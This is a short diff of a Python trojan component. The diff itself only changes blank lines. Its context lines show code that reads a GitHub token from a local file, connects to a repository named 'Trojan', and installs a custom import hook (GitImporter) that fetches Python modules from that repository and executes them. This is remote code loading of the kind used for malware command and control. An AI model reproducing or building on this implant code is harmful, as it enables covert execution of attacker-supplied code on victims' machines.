@@ -6,6 +6,7 @@ import sys
 import base64
 import traceback
 
+
 def github_connect():
     # Get the path to the mytoken.txt file relative to the current script
     token_path = os.path.join(os.path.dirname(__file__), 'mytoken.txt')
@@ -27,6 +28,7 @@ def github_connect():
     # Return the repository object
     return sess.repository(user, 'Trojan')
 
+
 # Move get_file_contents to the module level
 def get_file_contents(dirname, module_name, repo):
     try:
@@ -36,16 +38,16 @@ def get_file_contents(dirname, module_name, repo):
         raise FileNotFoundError(f"File {dirname}/{module_name} not found in the repository.")
 
 
-
-
 class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
     """
     Custom importer to fetch and load Python modules from a GitHub repository.
     """
 
+
     def __init__(self):
         self.current_module_code = ""
         self.repo = github_connect()
+
 
     def find_spec(self, fullname, path=None, target=None):
         """
@@ -82,11 +84,13 @@ class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
             traceback.print_exc()
         return None
 
+
     def create_module(self, spec):
         """
         Optional method; can return None to use default module creation.
         """
         return None  # Use default module creation semantics
+
 
     def exec_module(self, module):
         """
